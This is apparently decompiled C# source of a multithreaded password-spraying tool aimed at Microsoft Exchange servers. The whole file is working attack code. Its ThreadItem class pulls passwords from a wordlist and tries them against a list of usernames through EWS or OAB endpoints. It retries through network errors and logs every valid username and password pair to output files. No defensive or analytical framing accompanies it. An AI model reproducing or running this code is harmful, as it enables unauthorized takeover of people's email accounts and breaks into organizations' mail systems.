using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Microsoft.Exchange.WebServices.Data;

namespace Jason
{
	// Token: 0x02000008 RID: 8
	internal class ThreadItem
	{
		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000023 RID: 35 RVA: 0x000021CC File Offset: 0x000003CC
		// (set) Token: 0x06000024 RID: 36 RVA: 0x000021D4 File Offset: 0x000003D4
		public int pNumber { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000025 RID: 37 RVA: 0x000021DD File Offset: 0x000003DD
		// (set) Token: 0x06000026 RID: 38 RVA: 0x000021E5 File Offset: 0x000003E5
		public string pCurrentUsername { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000027 RID: 39 RVA: 0x000021EE File Offset: 0x000003EE
		// (set) Token: 0x06000028 RID: 40 RVA: 0x000021F6 File Offset: 0x000003F6
		public string pCurrentPassword { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000029 RID: 41 RVA: 0x000021FF File Offset: 0x000003FF
		// (set) Token: 0x0600002A RID: 42 RVA: 0x00002207 File Offset: 0x00000407
		public string pStatus { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600002B RID: 43 RVA: 0x00002210 File Offset: 0x00000410
		// (set) Token: 0x0600002C RID: 44 RVA: 0x00002218 File Offset: 0x00000418
		public long pTotalCheck { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600002D RID: 45 RVA: 0x00002221 File Offset: 0x00000421
		// (set) Token: 0x0600002E RID: 46 RVA: 0x00002229 File Offset: 0x00000429
		public int pTotalSuccess { get; set; }

		// Token: 0x0600002F RID: 47 RVA: 0x00005180 File Offset: 0x00003380
		public ThreadItem(int pnumber)
		{
			this.pNumber = pnumber;
			this.pThread = new Thread(delegate()
			{
				this.CheckEmail();
			});
			this.pCurrentUsername = string.Empty;
			this.pCurrentPassword = string.Empty;
			this.pStatus = string.Empty;
			this.pTotalCheck = 0L;
			this.pTotalSuccess = 0;
			this.StartTime = DateTime.Now;
			this.ExService = new ExchangeService(MainConfig.ExchangeVersion);
			this.ExService.Url = new Uri(MainConfig.ExchangeUrl, (MainConfig.Method == "EWS") ? "/ews/exchange.asmx" : ((MainConfig.Method == "Full") ? "" : "/oab"));
			this.ResultFile = string.Concat(new object[]
			{
				MainConfig.AppLocation,
				"out",
				this.pNumber,
				".txt"
			});
			this.pView = new FolderView(1, 0, OffsetBasePoint.Beginning);
			this.pView.PropertySet = PropertySet.FirstClassProperties;
			this.pView.Traversal = FolderTraversal.Deep;
			this.IsDone = false;
			this.pThread.Start();
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000052C0 File Offset: 0x000034C0
		public static bool GetPassword(out string Password)
		{
			Password = string.Empty;
			ThreadItem.semPass.WaitOne();
			bool result;
			if (!(result = PasswordManager.GetNext(out Password)))
			{
				string text;
				Password = (text = MainConfig.StreamPassword.ReadLine());
				if (text != null)
				{
					if (PasswordManager.HasPattern(Password))
					{
						PasswordManager.SetPassword(Password);
						result = PasswordManager.GetNext(out Password);
					}
					else
					{
						result = true;
					}
				}
			}
			ThreadItem.semPass.Release();
			return result;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00005324 File Offset: 0x00003524
		private LinkedListNode<UserClass> GetNextUser(LinkedListNode<UserClass> current)
		{
			ThreadItem.semUser.WaitOne();
			LinkedListNode<UserClass> next;
			do
			{
				next = current.Next;
			}
			while (next != null && next.Value.IsDone);
			ThreadItem.semUser.Release();
			return next;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00005364 File Offset: 0x00003564
		private void CheckEmail()
		{
			this.pStatus = "Working";
			try
			{
				string empty = string.Empty;
				while (ThreadItem.GetPassword(out empty))
				{
					try
					{
						if (MainConfig.Usernames.Count((UserClass a) => !a.IsDone) > 0)
						{
							int num = MainConfig.MaxTryForPass;
							for (int i = 0; i < MainConfig.Usernames.Count; i++)
							{
								UserClass userClass = MainConfig.Usernames[i];
								if (!userClass.IsDone)
								{
									this.pCurrentUsername = MainConfig.UsernameStart + userClass.Username + MainConfig.UsernameEnd;
									this.pCurrentPassword = PasswordManager.CheckUser(empty, userClass);
									this.ExService.Credentials = new WebCredentials(this.pCurrentUsername, this.pCurrentPassword);
									try
									{
										try
										{
											this.ExService.FindFolders(WellKnownFolderName.Root, this.pView);
										}
										catch (Exception ex)
										{
											if (!(ex.Message.ToLower() == "the specified object was not found in the store.") && !(ex.Message.ToLower() == "the specified folder could not be found in the store.") && !ex.Message.ToLower().Contains("the 'id' attribute is invalid"))
											{
												throw;
											}
										}
										File.AppendAllText(this.ResultFile, this.pCurrentUsername + "|" + this.pCurrentPassword + Environment.NewLine);
										int pTotalSuccess = this.pTotalSuccess;
										this.pTotalSuccess = pTotalSuccess + 1;
										ThreadItem.semUser.WaitOne();
										userClass.IsDone = true;
										ThreadItem.semUser.Release();
										goto IL_35E;
									}
									catch (Exception ex2)
									{
										if (!ex2.Message.Contains("401") && ex2.Message.ToLower() != "thread was being aborted.")
										{
											if (!ex2.Message.Contains("Unable to connect to the remote server") && !ex2.Message.Contains("connection was closed") && !ex2.Message.Contains("The remote name could not be resolved") && !ex2.Message.Contains("didn't contain valid XML") && !ex2.Message.Contains("The operation has timed out"))
											{
												File.AppendAllText(this.ResultFile, string.Concat(new string[]
												{
													this.pCurrentUsername,
													"|",
													this.pCurrentPassword,
													"|",
													ex2.Message,
													Environment.NewLine
												}));
												int pTotalSuccess = this.pTotalSuccess;
												this.pTotalSuccess = pTotalSuccess + 1;
												ThreadItem.semUser.WaitOne();
												userClass.IsDone = true;
												ThreadItem.semUser.Release();
											}
											else
											{
												num--;
												if (num >= 0)
												{
													int num2 = MainConfig.TryTimeIncrease[MainConfig.MaxTryForPass - num - 1];
													this.pStatus = MainConfig.MaxTryForPass - num + " try - " + ex2.Message;
													File.AppendAllText("log.txt", string.Concat(new object[]
													{
														this.pCurrentUsername,
														"|",
														this.pCurrentPassword,
														"|After ",
														num2,
														"ms Try ",
														MainConfig.MaxTryForPass - num,
														" Times -> ",
														ex2.Message,
														Environment.NewLine
													}));
													Thread.Sleep(num2);
													i--;
													goto IL_355;
												}
											}
										}
										goto IL_35E;
									}
									goto IL_355;
									IL_35E:
									long pTotalCheck = this.pTotalCheck;
									this.pTotalCheck = pTotalCheck + 1L;
									this.pStatus = "Working";
								}
								IL_355:;
							}
						}
					}
					catch (Exception ex3)
					{
						this.pStatus = "Error : " + ex3.Message;
						File.AppendAllText("log.txt", ex3.ToString() + Environment.NewLine);
					}
				}
			}
			catch (Exception ex4)
			{
				this.pStatus = "Error : " + ex4.Message;
			}
			if (this.pStatus == "Working")
			{
				this.pStatus = "Done";
				this.pCurrentUsername = "-";
				this.pCurrentPassword = "-";
			}
			this.IsDone = true;
		}

		// Token: 0x0400004B RID: 75
		public static Semaphore semPass = new Semaphore(1, 1);

		// Token: 0x0400004C RID: 76
		public static Semaphore semUser = new Semaphore(1, 1);

		// Token: 0x0400004E RID: 78
		public Thread pThread;

		// Token: 0x04000054 RID: 84
		public DateTime StartTime;

		// Token: 0x04000055 RID: 85
		private ExchangeService ExService;

		// Token: 0x04000056 RID: 86
		private FolderView pView;

		// Token: 0x04000057 RID: 87
		private string ResultFile;

		// Token: 0x04000058 RID: 88
		public bool IsDone;
	}
}
